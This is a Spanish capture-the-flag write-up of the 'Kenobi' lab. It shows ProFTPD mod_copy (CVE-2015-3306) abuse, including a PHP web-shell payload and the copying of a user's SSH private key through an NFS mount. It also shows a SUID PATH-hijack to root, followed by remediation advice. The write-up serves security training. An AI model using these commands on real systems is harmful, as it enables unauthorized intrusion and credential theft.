# Kenobi
Room interesante enumeracion al principio , exploit diferente  a lo común ya que no es tirar el exploit del CVE, si no mas bien saber como usarlo a tu favor y privesc personalizada

Interesntes: CVE 2015-3306 , Path manipulation
## Initial Scan 
```
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      35429/udp   mountd
|   100005  1,2,3      38895/udp6  mountd
|   100005  1,2,3      46771/tcp6  mountd
|   100005  1,2,3      47749/tcp   mountd
|   100021  1,3,4      37411/tcp6  nlockmgr
|   100021  1,3,4      45275/tcp   nlockmgr
|   100021  1,3,4      46996/udp   nlockmgr
|   100021  1,3,4      56538/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
34743/tcp open  mountd      1-3 (RPC #100005)
39631/tcp open  mountd      1-3 (RPC #100005)
45275/tcp open  nlockmgr    1-4 (RPC #100021)
47749/tcp open  mountd      1-3 (RPC #100005)

```
## Enum
### FTP
Version vulnerable a CVE 2015-3306 
```
site cpfr /proc/self/cmdline
site cpto /tmp/.<?php passthru($_GET['cmd']);?>
site cpfr /tmp/.<?php passthru($_GET['cmd']);?>
site cpto /var/www/html/backdoor.php
```
Probamos eso pero no podemos hacer la copia a final, aun asi sabemos que es vulnerable asi que no esta todo perdido, exploremos esto mas tarde
### SMB
Veamos los shares
```
	print$          Disk      Printer Drivers
	anonymous       Disk      
	IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
```
Y nos descargamos todo lo que haya en anonymous
```
 smbget smb://10.10.117.123//anonymous -R
```
Y obtenemos un log.txt, donde hay un par de lineas  interesantes
```
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
```
### Mountd
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount IP
```
Veremos que esta montado /var

## Explotation

El plan es el siguiente, copiamos la clave a /var/tmp y montamos /vat/tmp en nuestra máquina
### FTP
```
ftp> site cpfr /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
ftp> site cpto /var/tmp/id_rsa
```
### Montaje
```
sudo mount 10.10.117.123:/var kenobi/
```
### SSH
```
ssh -i id_rsa kenobi@10.10.117.123
```
## Privesc
Buscamos SUID binarys y encontramos uno poco comun
```
/usr/bin/menu
```
Mirando las strings encontramos las 3 siguientes
```
curl -I localhost
uname -r
ifconfig
```
Dado que los comandos no estan con su ruta al completo podemos ejecutar un PATH manipulation
```
cp /bin/bash /tmp/ifconfig
PATH=/tmp:$PATH
 ./../usr/bin/menu 
```
Y ya tenemos shell como root

# Analisis de la intrusion
### SMB Null Sesion
La Null Sesion esta habilitada, de modo que tenemos acceso a archivos compartidos con información sensible sin necesidad de tipo alguno de autenticación
### CVE 2015-3306
El sistema permite copiar archivos sin necesidad de estar autenticados
### SUID 
Existe un SUID en el archivo de /usr/bin/menu lo que permite la ejecución de un pequeño subset de comandos como root
### Path Manipulation
A la hora de hacer las llamadas a funciones del sistema no se utiliza la ruta completa, lo que permite manipular el PATH , ejecutando cualquier comando de esta manera.

# Solucion
### SMB Null Sesion
Añadir las dos siguientes lineas a smb.conf deberia mitigar esta enumeracion lo cual dificultaria el reconocimiento de la misma por parte de los atacantes
```
map to guest = Never
restrict anonymous = 2
```
### CVE 2015-3306
Para mitigar el impacto lo mejor que podemos hacer es parchear a la siguiente versión, si no fuese posible retirar permisos de lectura a frpuser a archivos criticos, o al menos el de escritura en zonas que pueden ser leidas desde el exterior
### SUID
El SUID aqui es inecesario ya que los 3 binariso pueden ser usados como usuario común sin problema, lo ideal seria retirarlo
### Path Manipulation
Para solventar esto se puede hacer 2 cosas distintas , la primera en el binario de menu cambiar las rutas por rutas absolutas de modo que no se pueda ejecutar en otro path , la otra opcion es hacer del path una variable de solo lectura
